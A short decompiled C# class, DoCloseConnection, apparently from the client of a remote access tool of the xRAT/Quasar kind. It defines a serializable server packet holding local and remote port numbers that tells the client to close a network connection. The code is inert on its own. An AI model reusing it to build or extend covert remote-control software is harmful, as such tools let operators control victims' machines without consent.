using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoCloseConnection : GInterface4
{
	public int LocalPort { get; set; }

	public int RemotePort { get; set; }

	public DoCloseConnection()
	{
	}

	public DoCloseConnection(int localport, int remoteport)
	{
		LocalPort = localport;
		RemotePort = remoteport;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
